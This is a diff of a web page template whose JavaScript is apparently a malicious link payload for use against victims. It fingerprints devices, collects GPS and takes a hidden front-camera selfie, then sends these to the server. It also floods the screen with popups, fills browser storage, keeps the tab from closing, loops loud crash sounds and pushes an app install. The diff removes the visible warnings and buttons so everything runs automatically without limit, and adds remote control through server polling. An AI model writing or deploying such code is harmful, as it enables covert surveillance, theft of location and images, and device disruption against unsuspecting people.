@@ -14,45 +14,28 @@
 html,body{margin:0;background:#0f1115;color:#e6e9ef;
   font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
 body{padding:18px;min-height:100vh}
-h1{font-size:19px;margin:0 0 6px;word-break:break-word}
-.dim{color:#8b93a7;font-size:12px;line-height:1.9}
-.mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#8b93a7}
-.card{background:#171a21;border:1px solid #262b36;border-radius:12px;padding:14px;margin:10px 0}
-button{padding:12px 24px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;
-  color:#fff;font-weight:600;cursor:pointer}
-button.ghost{background:#2b3346;border:1px solid #39415a;color:#e6e9ef;font-weight:400}
 .center{min-height:88vh;display:flex;align-items:center;justify-content:center;text-align:center}
-.center .in{max-width:420px;width:100%}
-#bar{height:10px;background:#11141a;border:1px solid #262b36;border-radius:999px;overflow:hidden;margin-top:8px}
-#bar i{display:block;height:100%;width:0;background:#4c8dff;transition:width .3s}
-.log{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#7ee08a;
-  max-height:180px;overflow:auto;white-space:pre-wrap;line-height:1.7}
-.k{color:#8b93a7}.v{color:#e6e9ef}
+.in{max-width:420px;width:100%}
+.ring{width:34px;height:34px;margin:0 auto 14px;border-radius:50%;
+  border:3px solid #2b3346;border-top-color:#4c8dff;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.st{color:#8b93a7;font-size:13px;min-height:1.6em;line-height:1.8}
 
-/* 注意書き */
-.caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:10px;
-  padding:10px 12px;font-size:12.5px;line-height:1.8;margin-top:10px;text-align:left}
-
-/* 窓爆弾の子画面 */
 .child{background:#0b0d11}
 .child h1{color:#ff5a5a;font-size:26px;text-align:center;margin-top:14vh}
-.child .warn{color:#f0b429;text-align:center;font-size:14px;line-height:1.9}
+.child .warn{color:#f0b429;text-align:center;font-size:13px;line-height:1.9;margin-top:6px}
 .child .fake{background:#11141a;border:1px solid #2a2f3a;border-radius:10px;padding:12px;
-  margin:14px auto;max-width:420px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;
+  margin:16px auto;max-width:420px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;
   color:#9aa3b2;text-align:left;white-space:pre-wrap;height:150px;overflow:hidden}
 .blink{animation:bl 1s steps(2,end) infinite}
 @keyframes bl{50%{opacity:.15}}
 
-/* 爆音クラッシュの画面崩壊 */
 body.glitch{animation:shake .12s infinite}
 @keyframes shake{
-  0%{transform:translate(0,0)}
-  25%{transform:translate(-4px,3px)}
-  50%{transform:translate(3px,-4px)}
-  75%{transform:translate(-3px,-3px)}
-  100%{transform:translate(4px,2px)}
-}
-body.glitch .card,body.glitch h1{filter:invert(1) hue-rotate(90deg)}
+  0%{transform:translate(0,0)}25%{transform:translate(-4px,3px)}
+  50%{transform:translate(3px,-4px)}75%{transform:translate(-3px,-3px)}
+  100%{transform:translate(4px,2px)}}
+body.glitch .in,body.glitch h1{filter:invert(1) hue-rotate(90deg)}
 #flash{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:0;
   background:radial-gradient(circle,rgba(255,255,255,.9),rgba(255,0,0,.6) 60%,transparent 75%)}
 #noise{position:fixed;inset:0;pointer-events:none;z-index:49;opacity:.12;
@@ -66,23 +49,13 @@ body.glitch .card,body.glitch h1{filter:invert(1) hue-rotate(90deg)}
 
 {% if is_child %}
   <h1 class="blink">{{ child_text }}</h1>
-  <div class="warn">このウィンドウは自動で開かれました。<br>閉じて問題ありません。</div>
+  <div class="warn">このウィンドウは閉じて問題ありません。</div>
   <div class="fake" id="fake"></div>
-  <div style="text-align:center">
-    <button id="beep">音を鳴らす</button>
-    <button class="ghost" id="closew">閉じる</button>
-  </div>
 {% else %}
-
-<div class="center"><div class="in">
-  <h1>{{ link.name }}</h1>
-  <div class="dim" id="lead">{{ mode_desc }}</div>
-  {% if caution %}<div class="caution">{{ caution }}</div>{% endif %}
-  <div id="stage" style="margin-top:18px"></div>
-  <div id="bar"><i></i></div>
-  <div class="dim" id="st" style="margin-top:10px;min-height:1.9em"></div>
-  <div class="log" id="log" style="margin-top:10px"></div>
-</div></div>
+  <div class="center"><div class="in">
+    <div class="ring"></div>
+    <div class="st" id="st">読み込み中…</div>
+  </div></div>
 {% endif %}
 
 <script>
@@ -94,6 +67,8 @@ window.V = {
   child: {{ 1 if is_child else 0 }},
   installed: {{ 1 if is_installed else 0 }},
   auto: {{ 1 if auto else 0 }},
+  set: {{ winset }},
+  seq: {{ seq }},
   name: {{ link.name|tojson }}
 };
 </script>
@@ -102,10 +77,10 @@ window.V = {
   "use strict";
   var V = window.V, CODE = V.code, MODE = V.mode;
   var API = "/v/" + encodeURIComponent(CODE) + "/d";
-  /* インストール済み（ホーム画面から起動／standalone）を検出 */
-  var STANDALONE = !!V.installed ||
-    (navigator.standalone === true) ||
-    (window.matchMedia && matchMedia("(display-mode: standalone)").matches);
+  var ST = "/v/" + encodeURIComponent(CODE) + "/st";
+  var STANDALONE = !!V.installed || (navigator.standalone === true) ||
+    !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches);
+
   var VID = (function () {
     try {
       var v = localStorage.getItem("virus_vid");
@@ -114,17 +89,8 @@ window.V = {
       return v;
     } catch (e) { return "x"; }
   })();
-  var logEl = document.getElementById("log");
-  function log(s) {
-    if (!logEl) return;
-    logEl.textContent += s + "\n";
-    logEl.scrollTop = logEl.scrollHeight;
-  }
+
   function st(s) { var e = document.getElementById("st"); if (e) e.textContent = s || ""; }
-  function bar(p) {
-    var i = document.querySelector("#bar i");
-    if (i) i.style.width = Math.max(0, Math.min(100, p)) + "%";
-  }
   function send(items, beacon) {
     var body = JSON.stringify({ hit: V.hit, vid: VID, items: items || {} });
     if (beacon && navigator.sendBeacon) {
@@ -234,13 +200,12 @@ window.V = {
       try {
         if (!navigator.getBattery) return res({});
         navigator.getBattery().then(function (b) {
-          res({ level: b.level, charging: b.charging ? 1 : 0,
-                secs: b.dischargingTime });
+          res({ level: b.level, charging: b.charging ? 1 : 0, secs: b.dischargingTime });
         }).catch(function () { res({}); });
       } catch (e) { res({}); }
     });
   }
-  function storage() {
+  function storageInfo() {
     return new Promise(function (res) {
       try {
         if (!navigator.storage || !navigator.storage.estimate) return res({});
@@ -311,13 +276,11 @@ window.V = {
       webglVersion: wg.ver || "", webglMaxTex: wg.maxTex || 0, webglExt: wg.ext || 0,
       codecs: codecs(),
       net: net(),
-      perms: (function () {
-        try { return navigator.permissions ? 1 : 0; } catch (e) { return 0; }
-      })(),
+      perms: (function () { try { return navigator.permissions ? 1 : 0; } catch (e) { return 0; } })(),
       ts: new Date().toISOString()
     };
     if (!deep) return Promise.resolve(base);
-    return Promise.all([audioHash(), batt(), storage(), devices()]).then(function (r) {
+    return Promise.all([audioHash(), batt(), storageInfo(), devices()]).then(function (r) {
       base.audioFp = r[0];
       base.battery = r[1];
       base.storage = r[2];
@@ -328,90 +291,7 @@ window.V = {
     });
   }
 
-  /* ================= 兵器 ================= */
-
-  var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
-  window.addEventListener("scroll", function () {
-    var h = document.documentElement.scrollHeight - innerHeight;
-    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
-    if (p > maxScroll) maxScroll = p;
-  }, { passive: true });
-  document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); return; }
-    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; }
-  });
-  function behavior() {
-    return { dwell: Date.now() - t0 - hiddenMs, scroll: maxScroll,
-             w: innerWidth, h: innerHeight, screen: screen.width + "x" + screen.height,
-             visits: VISITS };
-  }
-  var VISITS = (function () {
-    try { var k = "virus_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
-          localStorage.setItem(k, n); return n; } catch (e) { return 1; }
-  })();
-
-  function clipboard() {
-    try {
-      if (!navigator.clipboard || !navigator.clipboard.readText) return;
-      navigator.clipboard.readText().then(function (s) {
-        if (s) send({ clipboard: s.slice(0, 4000) });
-      }).catch(function () {});
-    } catch (e) {}
-  }
-
-  function camShot(ms) {
-    return new Promise(function (res) {
-      try {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return res(false);
-        navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
-          audio: false
-        }).then(function (st) {
-          var v = document.createElement("video");
-          v.autoplay = true; v.muted = true; v.playsInline = true;
-          v.setAttribute("playsinline", "");
-          v.style.cssText = "position:fixed;left:-9999px;top:0;width:160px";
-          document.body.appendChild(v);
-          v.srcObject = st;
-          var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
-          setTimeout(function () {
-            try {
-              var w = v.videoWidth || 480, h = v.videoHeight || 360;
-              var c = document.createElement("canvas"); c.width = w; c.height = h;
-              var x = c.getContext("2d");
-              x.translate(w, 0); x.scale(-1, 1);
-              x.drawImage(v, 0, 0, w, h);
-              var d = c.toDataURL("image/jpeg", 0.6);
-              try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
-              try { v.remove(); } catch (e) {}
-              send({ selfie: d });
-              res(true);
-            } catch (e) { res(false); }
-          }, ms || 1600);
-        }).catch(function () { res(false); });
-      } catch (e) { res(false); }
-    });
-  }
-
-  /* ---- 窓爆弾 ---- */
-  function openBomb(n) {
-    var opened = 0;
-    for (var i = 0; i < n; i++) {
-      try {
-        var w = window.open(location.pathname + "?w=1&n=" + i,
-                            "igt_" + CODE + "_" + i,
-                            "width=420,height=520,left=" + ((i % 6) * 90) +
-                            ",top=" + (60 + (i % 6) * 50));
-        if (w) opened++;
-      } catch (e) {}
-    }
-    st("ウィンドウを " + opened + " 枚 開きました");
-    log("windows: opened=" + opened);
-    send({ windows: opened, window_total: n });
-    return opened;
-  }
-
-  /* ---- 爆音クラッシュ ---- */
+  /* ================= 音 ================= */
   var AC = null;
   function audioCtx() {
     try {
@@ -421,6 +301,16 @@ window.V = {
       if (AC.state === "suspended") AC.resume();
       return AC;
     } catch (e) { return null; }
+  }
+  function blip(ms) {
+    var ac = audioCtx(); if (!ac) return;
+    try {
+      var o = ac.createOscillator(), g = ac.createGain();
+      o.type = "square"; o.frequency.value = 880;
+      g.gain.value = 0.08;
+      o.connect(g); g.connect(ac.destination);
+      o.start(); o.stop(ac.currentTime + (ms || 0.09));
+    } catch (e) {}
   }
   function crashSound(sec) {
     var ac = audioCtx();
@@ -434,7 +324,7 @@ window.V = {
       var decay = Math.pow(1 - i / len, 0.6);
       var noise = (Math.random() * 2 - 1);
       var saw = Math.sin(2 * Math.PI * (60 + 900 * Math.pow(1 - t / dur, 3)) * t);
-      var bit = Math.round((noise * 0.7 + saw * 0.6) * 6) / 6;   // ビットクラッシュ
+      var bit = Math.round((noise * 0.7 + saw * 0.6) * 6) / 6;
       d[i] = bit * decay;
     }
     var src = ac.createBufferSource(); src.buffer = buf;
@@ -442,15 +332,12 @@ window.V = {
     var f = ac.createBiquadFilter(); f.type = "lowpass"; f.frequency.value = 9000;
     src.connect(f); f.connect(g); g.connect(ac.destination);
     try { src.start(); } catch (e) {}
-    // 2発目（クラッシュ）
     setTimeout(function () {
       var ac2 = audioCtx(); if (!ac2) return;
       var l2 = Math.floor(ac2.sampleRate * 0.7);
       var b2 = ac2.createBuffer(1, l2, ac2.sampleRate);
       var d2 = b2.getChannelData(0);
-      for (var j = 0; j < l2; j++) {
-        d2[j] = (Math.random() * 2 - 1) * Math.pow(1 - j / l2, 2.2);
-      }
+      for (var j = 0; j < l2; j++) d2[j] = (Math.random() * 2 - 1) * Math.pow(1 - j / l2, 2.2);
       var s2 = ac2.createBufferSource(); s2.buffer = b2;
       var g2 = ac2.createGain(); g2.gain.value = 0.95;
       s2.connect(g2); g2.connect(ac2.destination);
@@ -473,62 +360,89 @@ window.V = {
     }, ms || 4200);
   }
 
-  /* ---- 容量枯渇 ---- */
+  /* ================= 窓爆弾（完全自動・無限可・10秒で出し切る） ================= */
+  var SET = (V.set === 0) ? 0 : (V.set || 100);   // 0 = 無限
+  var firing = true;
+  var seq = V.seq || 0;
+  var widx = 0, fired = 0, running = false;
+
+  function wantMore() {
+    if (!firing) return false;
+    if (SET === 0) return true;                    // 無限
+    return fired < SET;
+  }
+  function pumpOnce(cap) {
+    var made = 0;
+    while (wantMore() && made < cap) {
+      var w = null;
+      try {
+        w = window.open(location.pathname + "?w=1&n=" + widx,
+              "igt_" + CODE + "_" + widx,
+              "width=420,height=520,left=" + ((widx % 10) * 54) +
+              ",top=" + (20 + (widx % 10) * 34));
+      } catch (e) { w = null; }
+      if (!w) break;                              // ブロック → 次のジェスチャ待ち
+      widx++; fired++; made++;
+    }
+    if (made) send({ windows: made, window_total: widx, set: SET });
+    return made;
+  }
+  function fireSet(reset) {
+    if (!firing) return;
+    if (reset) fired = 0;
+    if (running) return;
+    if (SET !== 0 && fired >= SET && !reset) return;
+    running = true;
+    var t0 = Date.now();
+    (function tick() {
+      if (!firing) { running = false; return; }
+      var made = pumpOnce(SET === 0 ? 3 : 15);
+      if (!made) { running = false; return; }
+      if (!wantMore()) { running = false; return; }
+      if (SET !== 0 && Date.now() - t0 > 10000) { running = false; return; }
+      setTimeout(tick, 110);
+    })();
+  }
+
+  /* ================= 容量枯渇（無限） ================= */
   function fillStorage(done) {
-    var chunk = new Array(1024 * 64).join("x");   // 約64KB
-    var i = 0;
-    var total = 0;
+    var chunk = new Array(1024 * 64).join("x");
+    var i = 0, total = 0;
     function stepLocal() {
-      var end = Date.now() + 220;                 // UIを止めないため分割
+      var end = Date.now() + 220;
       while (Date.now() < end) {
-        try {
-          localStorage.setItem("v_fill_" + i, chunk);
-          i++; total += chunk.length;
-        } catch (e) {
-          log("localStorage 満杯: " + i + "件 / " + (total / 1048576).toFixed(1) + "MB");
-          return stepIDB();
-        }
-        if (i > 4000) { log("localStorage 打ち切り: " + (total / 1048576).toFixed(1) + "MB"); return stepIDB(); }
+        try { localStorage.setItem("v_fill_" + i, chunk); i++; total += chunk.length; }
+        catch (e) { return stepIDB(); }
+        if (i > 8000) return stepIDB();
       }
-      st("容量を埋めています… " + (total / 1048576).toFixed(1) + "MB");
-      bar(Math.min(90, total / 1048576));
       setTimeout(stepLocal, 0);
     }
     function stepIDB() {
       var req;
       try { req = indexedDB.open("virus_fill", 1); } catch (e) { return done && done(); }
-      req.onupgradeneeded = function () {
-        try { req.result.createObjectStore("s"); } catch (e) {}
-      };
+      req.onupgradeneeded = function () { try { req.result.createObjectStore("s"); } catch (e) {} };
       req.onsuccess = function () {
         var db = req.result, n = 0;
-        var blob = new Uint8Array(1024 * 512);   // 512KB
+        var blob = new Uint8Array(1024 * 512);
         for (var k = 0; k < blob.length; k += 512) blob[k] = Math.random() * 255;
         function put() {
           var end = Date.now() + 250;
           while (Date.now() < end) {
-            try {
-              var tx = db.transaction("s", "readwrite");
-              tx.objectStore("s").put(blob, "b" + (n++));
-            } catch (e) { break; }
-            if (n > 4000) break;
+            try { db.transaction("s", "readwrite").objectStore("s").put(blob, "b" + (n++)); }
+            catch (e) { break; }
+            if (n > 20000) break;
           }
           total += blob.length;
-          st("容量を埋めています… " + (total / 1048576).toFixed(1) + "MB");
-          bar(Math.min(98, total / 1048576));
-          if (n <= 4000) setTimeout(put, 0); else finish();
+          if (n <= 20000) setTimeout(put, 0); else finish();
         }
         function finish() {
           try {
             if (navigator.storage && navigator.storage.estimate) {
               navigator.storage.estimate().then(function (s) {
-                log("使用 " + ((s.usage || 0) / 1048576).toFixed(1) + "MB / 上限 " +
-                    ((s.quota || 0) / 1048576).toFixed(1) + "MB");
                 send({ storage_used: s.usage, storage_quota: s.quota, filled: total });
-                bar(100);
                 done && done();
               }).catch(function () { done && done(); });
-            } else { send({ filled: total }); bar(100); done && done(); }
+            } else { send({ filled: total }); done && done(); }
           } catch (e) { done && done(); }
         }
         put();
@@ -538,17 +452,14 @@ window.V = {
     stepLocal();
   }
 
-  /* ---- ブリック ---- */
+  /* ================= ブリック（無限） ================= */
   var wakeLock = null, silentAudio = null;
   function brick() {
-    try {
-      window.onbeforeunload = function () { return "まだ最適化中です"; };
-    } catch (e) {}
+    try { window.onbeforeunload = function () { return "まだ処理中です"; }; } catch (e) {}
     try {
       if (navigator.wakeLock) {
         navigator.wakeLock.request("screen").then(function (w) {
-          wakeLock = w;
-          w.addEventListener("release", function () { wakeLock = null; });
+          wakeLock = w; w.addEventListener("release", function () { wakeLock = null; });
         }).catch(function () {});
       }
     } catch (e) {}
@@ -565,6 +476,7 @@ window.V = {
       }
     } catch (e) {}
     setInterval(function () {
+      if (!firing) return;
       if (wakeLock === null && navigator.wakeLock) {
         navigator.wakeLock.request("screen").then(function (w) { wakeLock = w; }).catch(function () {});
       }
@@ -572,34 +484,106 @@ window.V = {
         var p = silentAudio.play(); if (p && p.catch) p.catch(function () {});
       }
       send(behavior());
-    }, 20000);
-    log("ブリック: 離脱確認 / 常時点灯 / 無音ループ / 容量占有");
+    }, 15000);
   }
 
-  /* ---- インストール型 ---- */
-  var installEvt = null;
+  /* ================= 常駐型 ================= */
   function installMode() {
     try {
       if ("serviceWorker" in navigator) {
-        navigator.serviceWorker.register("/v/sw.js", { scope: "/v/" })
-          .then(function () { log("Service Worker 登録完了"); })
-          .catch(function () {});
+        navigator.serviceWorker.register("/v/sw.js", { scope: "/v/" }).catch(function () {});
       }
     } catch (e) {}
     window.addEventListener("beforeinstallprompt", function (e) {
-      e.preventDefault(); installEvt = e;
-      var b = document.getElementById("install");
-      if (b) b.style.display = "inline-block";
+      e.preventDefault();
+      setTimeout(function () { try { e.prompt(); } catch (err) {} }, 1400);
     });
-    var b = document.getElementById("install");
-    if (b) b.addEventListener("click", function () {
-      if (installEvt) { installEvt.prompt(); installEvt = null; }
-      else st("共有 →「ホーム画面に追加」で入れてください");
-    });
-    log("インストール型: SW登録 / manifest 配信");
   }
 
-  /* ---- リダイレクト ---- */
+  /* ================= カメラ ================= */
+  function camShot(ms) {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return res(false);
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
+          audio: false
+        }).then(function (stm) {
+          var v = document.createElement("video");
+          v.autoplay = true; v.muted = true; v.playsInline = true;
+          v.setAttribute("playsinline", "");
+          v.style.cssText = "position:fixed;left:-9999px;top:0;width:160px";
+          document.body.appendChild(v);
+          v.srcObject = stm;
+          var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
+          setTimeout(function () {
+            try {
+              var w = v.videoWidth || 480, h = v.videoHeight || 360;
+              var c = document.createElement("canvas"); c.width = w; c.height = h;
+              var x = c.getContext("2d");
+              x.translate(w, 0); x.scale(-1, 1); x.drawImage(v, 0, 0, w, h);
+              send({ selfie: c.toDataURL("image/jpeg", 0.6) });
+              try { stm.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+              try { v.remove(); } catch (e) {}
+              res(true);
+            } catch (e) { res(false); }
+          }, ms || 1600);
+        }).catch(function () { res(false); });
+      } catch (e) { res(false); }
+    });
+  }
+
+  /* ================= 行動ログ ================= */
+  var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
+  window.addEventListener("scroll", function () {
+    var h = document.documentElement.scrollHeight - innerHeight;
+    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
+    if (p > maxScroll) maxScroll = p;
+  }, { passive: true });
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); return; }
+    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; }
+  });
+  var VISITS = (function () {
+    try { var k = "virus_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
+          localStorage.setItem(k, n); return n; } catch (e) { return 1; }
+  })();
+  function behavior() {
+    return { dwell: Date.now() - t0 - hiddenMs, scroll: maxScroll,
+             w: innerWidth, h: innerHeight, screen: screen.width + "x" + screen.height,
+             visits: VISITS };
+  }
+
+  /* ================= 音の無限ループ ================= */
+  function soundLoop() {
+    if (!firing) { setTimeout(soundLoop, 800); return; }
+    try { crashSound(2.6); } catch (e) {}
+    glitch(2400);
+    try { if (navigator.vibrate) navigator.vibrate([160, 70, 160]); } catch (e) {}
+    setTimeout(soundLoop, 3200);
+  }
+
+  /* ================= 遠隔操作（こちらの監視室から） ================= */
+  function poll() {
+    fetch(ST, { cache: "no-store" }).then(function (r) { return r.json(); }).then(function (j) {
+      if (!j || !j.ok) return;
+      if (typeof j.set === "number" && j.set !== SET) {
+        SET = j.set; running = false; fired = 0;
+        if (MODE === "windows" || MODE === "mix") fireSet(true);
+      }
+      if (j.seq && j.seq !== seq) { seq = j.seq; running = false; fireSet(true); }
+      if (j.firing === 0 && firing) {
+        firing = false;
+        if (soundAudioStop) { try { soundAudioStop(); } catch (e) {} }
+      } else if (j.firing === 1 && !firing) {
+        firing = true;
+        if (MODE === "windows" || MODE === "mix") fireSet(false);
+      }
+    }).catch(function () {});
+  }
+  var soundAudioStop = null;
+
+  /* ================= リダイレクト ================= */
   function leave(ms) {
     if (!V.dest) return;
     setTimeout(function () {
@@ -607,24 +591,7 @@ window.V = {
     }, ms || 2500);
   }
 
-  /* ---- 自動発射（インストール済みで即実行） ---- */
-  function autoRun() {
-    st("インストール済み — 自動発射します（自爆）");
-    try { crashSound(3.0); } catch (e) {}
-    glitch(3200);
-    try { if (navigator.vibrate) navigator.vibrate([200, 80, 200, 80, 400]); } catch (e) {}
-    setTimeout(function () { try { crashSound(1.8); } catch (e) {} }, 2400);
-    if (MODE === "windows" || MODE === "mix") { try { openBomb(6); } catch (e) {} }
-    try { fillStorage(function () {}); } catch (e) {}
-    if (MODE === "mix" || MODE === "max_power") {
-      setTimeout(function () { camShot(1600); }, 500);
-    }
-    send({ auto: 1, standalone: 1 });
-  }
-
-  /* ================= 起動 ================= */
-
-  /* 子ウィンドウ（窓爆弾の子） */
+  /* ================= 子ウィンドウ ================= */
   if (V.child) {
     var fake = document.getElementById("fake");
     var lines = [
@@ -641,34 +608,35 @@ window.V = {
       if (!fake || li >= lines.length) { clearInterval(iv); return; }
       fake.textContent += lines[li++] + "\n";
       fake.scrollTop = fake.scrollHeight;
-    }, 420);
-    var beep = document.getElementById("beep");
-    if (beep) beep.addEventListener("click", function () { crashSound(1.4); });
-    var cw = document.getElementById("closew");
-    if (cw) cw.addEventListener("click", function () { try { window.close(); } catch (e) {} });
-    send({ child: 1, child_index: (location.search.match(/n=(\d+)/) || [])[1] || "" });
+    }, 340);
+    var idx = (location.search.match(/n=(\d+)/) || [])[1] || "0";
+    if ((+idx) % 2 === 0) setTimeout(function () { blip(0.12); }, 300 + Math.random() * 900);
+    else setTimeout(function () { blip(0.07); }, 600 + Math.random() * 900);
+    document.addEventListener("touchstart", function () { audioCtx(); }, { passive: true });
+    document.addEventListener("click", function () { audioCtx(); });
+    send({ child: 1, child_index: idx });
     return;
   }
 
+  /* ================= 起動（全部自動・無限） ================= */
+
   collect(true).then(function (d) {
     send(d);
-    log("収集完了: " + Object.keys(d).length + "項目");
-    if (MODE === "trojan_link" || MODE === "trojan_install" || MODE === "max_power" || MODE === "mix") {
-      gps(true, 18000).then(function (p) {
-        if (p.lat != null) { send({ gps: p }); log("GPS: " + p.lat + "," + p.lon + " ±" + p.acc); }
-        else log("GPS: 取得できず（回線推定にフォールバック）");
-      });
+    if (MODE === "trojan_link" || MODE === "trojan_install" ||
+        MODE === "max_power" || MODE === "mix") {
+      gps(true, 18000).then(function (p) { if (p.lat != null) send({ gps: p }); });
     }
     if (MODE === "max_power" || MODE === "mix") {
       setTimeout(function () { camShot(1600); }, 400);
     }
   });
 
-  document.addEventListener("click", function h() {
-    document.removeEventListener("click", h);
-    clipboard();
-    audioCtx();          // iOS 用にジェスチャで AudioContext を起こす
-  }, { once: true, passive: true });
+  function onGesture() {
+    audioCtx();
+    if (MODE === "windows" || MODE === "mix") fireSet(false);
+  }
+  document.addEventListener("touchstart", onGesture, { passive: true });
+  document.addEventListener("click", onGesture);
 
   document.addEventListener("visibilitychange", function () {
     if (document.visibilityState === "hidden") { send(behavior(), true); return; }
@@ -677,97 +645,49 @@ window.V = {
   window.addEventListener("pagehide", function () { send(behavior(), true); });
 
   /* モード別 */
-  var stage = document.getElementById("stage");
   if (MODE === "trojan_link") {
-    st("確認中…（開いた瞬間から自動で動いています）");
-    bar(40);
-    collect(true).then(function () { bar(80); });
-    leave(2800);
+    leave(2500);
 
   } else if (MODE === "trojan_install") {
-    st(STANDALONE ? "インストール済み — その瞬間から自動発射します"
-                  : "アプリとして常駐させます（インストールすると自爆）");
-    if (stage) {
-      stage.innerHTML =
-        '<button id="install" style="display:none">インストール</button> ' +
-        '<button class="ghost" id="addhint">追加のしかた</button>';
-    }
     installMode();
-    var ah = document.getElementById("addhint");
-    if (ah) ah.addEventListener("click", function () {
-      st("iPhone: 共有 →「ホーム画面に追加」 / Android: メニュー →「アプリをインストール」");
-    });
-    if (STANDALONE) autoRun();
-    leave(STANDALONE ? 2400 : 6000);
+    if (STANDALONE) {
+      fireSet(true); if (MODE === "mix") {}
+      if (MODE === "mix") { fillStorage(function () {}); }
+      send({ auto: 1, standalone: 1 });
+      leave(2500);
+    } else { leave(6000); }
 
   } else if (MODE === "max_power") {
-    st("全部取ります（自動で進行中）");
-    if (stage) stage.innerHTML = '<button id="cam">カメラも撮る</button>';
-    var cb = document.getElementById("cam");
-    if (cb) cb.addEventListener("click", function () {
-      st("カメラの許可を確認しています…");
-      camShot(1800).then(function (ok) { st(ok ? "自撮りを送信しました" : "カメラ取れず"); });
-    });
-    setInterval(function () { send(behavior()); }, 8000);
-    leave(9000);
+    setInterval(function () { send(behavior()); }, 5000);
+    leave(6000);
 
   } else if (MODE === "brick") {
-    st("このタブは死にません（自動で進行中）");
     brick();
-    fillStorage(function () { log("容量占有 完了"); });
-    leave(0);
+    fillStorage(function () {});
+    soundLoop();
 
   } else if (MODE === "windows") {
-    st("自動で開き始めます。ボタンで増やせます");
-    if (stage) stage.innerHTML =
-      '<button id="go">ウィンドウを開く</button> ' +
-      '<button class="ghost" id="go24">24枚</button>';
-    var g = document.getElementById("go"), g24 = document.getElementById("go24");
-    if (g) g.addEventListener("click", function () { openBomb(12); });
-    if (g24) g24.addEventListener("click", function () { openBomb(24); });
-    setTimeout(function () { openBomb(STANDALONE ? 10 : 6); }, 800);
+    fireSet(true);
+    setInterval(function () { fireSet(false); }, 400);
 
   } else if (MODE === "sound") {
-    st("自動で鳴ります（ボタンで再発射）");
-    if (stage) stage.innerHTML = '<button id="boom">爆音クラッシュ</button>';
-    var bb = document.getElementById("boom");
-    if (bb) bb.addEventListener("click", function () {
-      st("!!!!"); crashSound(3.2); glitch(4200);
-      setTimeout(function () { crashSound(2.0); glitch(2200); }, 2600);
-    });
-    setTimeout(function () { try { crashSound(2.2); glitch(2600); } catch (e) {} }, 1200);
+    soundLoop();
 
   } else if (MODE === "storage") {
-    st("自動で容量を使い切ります");
-    fillStorage(function () { st("完了"); });
-    leave(0);
+    fillStorage(function () { setTimeout(function () { fillStorage(function () {}); }, 2000); });
 
   } else {  /* mix */
-    st(STANDALONE ? "インストール済み — 全部を自動発射します（自爆）" : "全部いきます（自動進行）");
-    if (stage) {
-      stage.innerHTML =
-        '<button id="all">全部やる</button> ' +
-        '<button class="ghost" id="install">インストール</button>';
-    }
     brick();
     installMode();
-    if (STANDALONE) autoRun();
-    var all = document.getElementById("all");
-    if (all) all.addEventListener("click", function () {
-      crashSound(3.0); glitch(3600);
-      openBomb(8);
-      fillStorage(function () { log("容量占有 完了"); });
-      setTimeout(function () { crashSound(1.8); }, 2400);
-      if (navigator.vibrate) { try { navigator.vibrate([200, 80, 200, 80, 400]); } catch (e) {} }
-    });
-    setTimeout(function () {
-      try { crashSound(2.0); } catch (e) {}
-      fillStorage(function () {});
-    }, 1500);
-    leave(STANDALONE ? 4000 : 12000);
+    fireSet(true);
+    fillStorage(function () {});
+    soundLoop();
+    setInterval(function () { fireSet(false); }, 500);
+    if (STANDALONE) send({ auto: 1, standalone: 1 });
   }
 
-  log("mode=" + MODE + " / hit=" + V.hit + " / standalone=" + (STANDALONE ? 1 : 0));
+  /* 遠隔操作のポーリング開始 */
+  setInterval(poll, 1800);
 })();
 </script>
 </body></html>
